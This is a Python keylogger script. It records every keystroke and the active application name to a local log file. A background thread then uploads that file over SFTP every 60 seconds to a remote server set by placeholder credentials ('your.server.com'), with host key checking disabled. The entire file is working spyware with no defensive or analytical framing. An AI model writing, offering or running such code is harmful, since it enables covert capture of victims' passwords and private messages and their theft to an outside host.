import os
import time
import paramiko
import threading
import psutil
import platform
from pynput import keyboard
from datetime import datetime

# SSH Configuration
SSH_HOST = "your.server.com"
SSH_PORT = 22
SSH_USERNAME = "your_user"
SSH_PASSWORD = "your_password"
REMOTE_DIR = "/home/your_user/logs/"  # Remote directory

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Define log file
LOG_FILE = "logs/keystrokes.log"

# Get active application name
def get_active_window():
    if platform.system() == "Windows":
        import ctypes
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        pid = ctypes.c_ulong()
        ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            if proc.info['pid'] == pid.value:
                return proc.info['name']
    elif platform.system() == "Linux":
        import subprocess
        try:
            output = subprocess.check_output(["wmctrl", "-lp"]).decode()
            for line in output.splitlines():
                parts = line.split()
                if len(parts) >= 3:
                    pid = int(parts[2])
                    for proc in psutil.process_iter(attrs=['pid', 'name']):
                        if proc.info['pid'] == pid:
                            return proc.info['name']
        except Exception:
            return "unknown_app"
    return "unknown_app"

# Global variable to track active window
current_window = None

# Log keystrokes
def on_press(key):
    global current_window
    new_window = get_active_window()

    try:
        with open(LOG_FILE, "a") as f:
            # Log application name if it changed
            if new_window != current_window:
                current_window = new_window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n[{timestamp}] Active Window: {current_window}\n")

            # Log keystrokes
            if hasattr(key, 'char'):  # Printable characters
                f.write(key.char)
            else:  # Special keys
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Error: {e}")

# Send logs via SSH
def send_ssh():
    while True:
        try:
            if os.path.exists(LOG_FILE):
                remote_path = os.path.join(REMOTE_DIR, "keystrokes.log")

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(SSH_HOST, port=SSH_PORT, username=SSH_USERNAME, password=SSH_PASSWORD)

                sftp = ssh.open_sftp()
                sftp.put(LOG_FILE, remote_path)  # Upload file
                sftp.close()
                ssh.close()

                print(f"Sent: {LOG_FILE}")
        except Exception as e:
            print(f"SSH Error: {e}")

        time.sleep(60)  # Send logs every 60 seconds

# Start Keylogger
with keyboard.Listener(on_press=on_press) as listener:
    threading.Thread(target=send_ssh, daemon=True).start()
    listener.join()
